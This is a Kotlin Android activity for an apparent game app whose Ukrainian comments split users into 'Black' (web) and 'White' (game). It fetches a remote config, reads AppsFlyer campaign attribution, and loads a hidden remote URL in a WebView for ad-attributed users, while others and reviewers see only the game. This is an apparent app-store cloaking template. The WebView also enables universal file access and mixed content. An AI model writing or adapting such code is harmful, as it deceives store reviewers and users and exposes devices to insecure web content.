package com.borocbernay.kasshsemir.util

import android.content.SharedPreferences
import android.os.Bundle
import android.view.View
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.addCallback
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.*
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.borocbernay.kasshsemir.appContext
import com.borocbernay.kasshsemir.databinding.ActivityMainBinding
import com.borocbernay.kasshsemir.game.utils.gdxGame
import kotlinx.coroutines.*
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.system.exitProcess

class MainActivity2 : AppCompatActivity() {

    companion object {
        private var isRedirectToGame = false
    }

    private val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("DATA", MODE_PRIVATE)

    private val coroutine = CoroutineScope(Dispatchers.Main)

    lateinit var binding : ActivityMainBinding

    var blockRedirect: () -> Unit = {}

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()

        // ТУТ Запускаєте Loader наприклад Lottie, що б юзер бачив що щось відбувається а не чорний екран

        // Поки лоадер крутить, визначаємо що показати юзеру (Black [Web] / White [Гра])
        startBlackLogic()
    }

    private fun exit() {
        log("exit")
        coroutine.launch {
            finishAndRemoveTask()
            delay(100)
            exitProcess(0)
        }

        // або реалізуйте закриття по своєму
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
    }

    // Init Web ----------------------------------------------------------------------------------

    @Suppress("DEPRECATION")
    fun initWeb() {
        coroutine.launch(Dispatchers.Main) {
            binding.webView.apply {
                settings.apply {
                    allowContentAccess = true
                    javaScriptEnabled = listOf(true).first()
                    javaScriptCanOpenWindowsAutomatically = true
                    allowFileAccess = true
                    mixedContentMode = 0
                    useWideViewPort = true
                    allowFileAccessFromFileURLs = true
                    allowUniversalAccessFromFileURLs = true
                    loadWithOverviewMode = true
                    domStorageEnabled = true
                    databaseEnabled = true
                }

                webViewClient = WebClient()

                // Реєструємо зворотний виклик у диспетчері
                onBackPressedDispatcher.addCallback {
                    if (canGoBack()) {
                        goBack()
                    } else {
                         exit()
                    }
                }
            }
        }
    }

    fun loadUrl(url: String) {
        runOnUiThread {
            log("loadUrl: $url")
            binding.webView.loadUrl(url)
        }
    }

    private inner class WebClient : WebViewClient() {
        override fun shouldOverrideUrlLoading(
            view: WebView?,
            request: WebResourceRequest?
        ): Boolean {

            log("redirect: ${request?.url.toString()}")

            isRedirectToGame = false

            if (request?.url.toString().contains("https://lichcapwhite")) {
                log("contains: (lichcapwhite) | відкриваємо Гру")
                isRedirectToGame = true
                blockRedirect()
                return true
            }

            return false
        }

        override fun onPageFinished(view: WebView?, url: String?) {
            log("onPageFinished: url = $url")

            if (url.toString().contains("about:blank").not() && isRedirectToGame.not()) {
                log("onPageFinished showWebView url = $url")
                if (binding.webView.isVisible.not()) {
                    showWebView()
                }
            }
        }
    }

    // Logic -----------------------------------------------------------------------------------------

    fun hideWebView() {
        runOnUiThread {
            // Ховаємо WebView
            binding.webView.visibility = View.GONE
            binding.webView.loadUrl("about:blank")
        }
    }

    fun showWebView() {
        runOnUiThread {
            binding.webView.visibility = View.VISIBLE
            binding.webView.requestFocus()
        }
    }

    // Logic Black ---------------------------------------------------------------------------

    private fun startBlackLogic() {
        log("startBlackLogic")
        blockRedirect = { logicOpenGame() }
        initWeb()

        val openedLink = sharedPreferences.getString("Opened_Link", "No_Link") ?: "No_Link"

        try {
            if (openedLink == "No_Link") {
                coroutine.launch(Dispatchers.Main) {
                    val gistJson = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    if (gistJson != null) {
                        AppsFlyerLib.getInstance().init(gistJson.afDevKey, getAppsFlyerConversionListener(gistJson.link), appContext)
                        AppsFlyerLib.getInstance().start(gdxGame.activity, gistJson.afDevKey, getAppsFlyerRequestListener())
                    } else {
                        logicOpenGame()
                    }
                }
            } else {
                loadUrl(openedLink)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            logicOpenGame()
        }
    }

    private fun getAppsFlyerConversionListener(sma: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$sma?campaign=$campaign&afAd=$afAd&media=$media&afId=$afId"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("Opened_Link", link).apply() }

                loadUrl(link)

            } else logicOpenGame()
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            logicOpenGame()
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
            logicOpenGame()
        }
    }

    private fun logicOpenGame() {
        // Ваша логіка відкриття Гри
    }

}